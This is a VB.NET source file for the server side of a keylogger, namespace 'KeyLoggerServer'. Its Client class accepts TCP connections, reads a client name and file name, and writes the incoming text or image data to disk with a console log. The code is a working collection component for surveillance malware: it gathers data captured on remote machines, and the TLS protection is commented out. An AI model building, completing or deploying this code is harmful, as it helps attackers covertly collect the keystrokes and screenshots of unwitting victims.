Imports System
Imports System.Text
Imports System.Net
Imports System.Net.Sockets
'Imports System.Net.Security
'Imports System.Security.Authentication
Imports System.Threading
Imports System.IO
Imports System.Text.RegularExpressions

Namespace KeyLoggerServer
    Public Class Client
        Dim Prog As Program
        Dim ClInfor As ClientInfo
        Public Cl As TcpClient
        Public NStream As NetworkStream
        Public Br As BinaryReader
        'Public ssl As SslStream

        Sub Receiver()  'Receive all incoming packets
            Dim f As FileStream, sF As String, iRead As Integer
            Dim a As Byte, b As Byte, fileName As String, i As Integer
            Dim fileData(1024) As Byte
            Try
                If (Cl.Client.Connected) Then
                    'Type = Br.ReadByte ' Loai du lieu 1 - Text; 2 - Image
                    a = Br.ReadByte ' Length clientname
                    Dim ca(a) As Byte
                    b = Br.ReadByte ' Length filename
                    Dim cb(b) As Byte
                    For i = 1 To a
                        ca(i) = Br.ReadByte
                    Next
                    'Br.Read(ca, 0, a)
                    ClInfor.Clientname = UnicodeEncoding.UTF8.GetString(ca)
                    'Br.Read(cb, 0, b)
                    For i = 1 To b
                        cb(i) = Br.ReadByte
                    Next
                    fileName = UnicodeEncoding.UTF8.GetString(cb)

                    sF = ClInfor.Clientname & "_" & fileName
                    Dim regexSearch As String = New String(Path.GetInvalidFileNameChars()) + New String(Path.GetInvalidPathChars())
                    Dim r As Regex = New Regex(String.Format("[{0}]", Regex.Escape(regexSearch)))

                    sF = r.Replace(sF, "")
                    f = File.Create(sF)

                    iRead = 1
                    While iRead > 0
                        iRead = Br.Read(fileData, 0, 1024)
                        If (iRead > 0) Then
                            f.Write(fileData, 0, iRead)
                        End If
                    End While
                    f.Close()
                    f.Dispose()
                    Console.WriteLine("[{0}] ({1}) ({2}) Writed file", DateTime.Now, ClInfor.Clientname, fileName)
                End If
            Catch ex As Exception
                Console.WriteLine("[{0}] ({1}) ({2}) User logged out Fn_Receiver", DateTime.Now, ClInfor.Clientname, ex.Message)
            End Try
        End Sub
        Sub SetupConn() 'Setup connection and
            Console.WriteLine("[{0}] New connection!", DateTime.Now)
            NStream = Cl.GetStream
            'ssl = New SslStream(NStream, False)
            'ssl.AuthenticateAsServer(Prog.cert, False, SslProtocols.Tls, True)
            Console.WriteLine("[{0}] Connection authenticated!", DateTime.Now)
            Br = New BinaryReader(NStream) 'ssl)
            ClInfor = New ClientInfo()
            ClInfor.IsConnected = True
            Try
                Receiver()
            Catch ex As Exception
                ClInfor.IsConnected = False
                Console.WriteLine("[{0}] ({1}) ({2}) User logged out Fn_SetupConn", DateTime.Now, ClInfor.Clientname, ex.Message)
            End Try
            CloseConn()
        End Sub
        Sub CloseConn() 'Close connection.
            Try
                ClInfor.IsConnected = False
                Br.Close()
                NStream.Close()
                Cl.Close()
                'ssl.Close()
                Console.WriteLine("[{0}] End of connection!", DateTime.Now)
            Catch ex As Exception
                Console.WriteLine("[{0}] ({1}) End of connection! Fn_CloseConn", DateTime.Now, ex.Message)
            End Try
        End Sub

        Public Sub New(P As Program, c As TcpClient)
            Prog = P
            Cl = c
            'Handle client in another thread.
            Dim t As Thread
            t = New Thread(New ThreadStart(AddressOf SetupConn))
            t.Start()
        End Sub
    End Class
End Namespace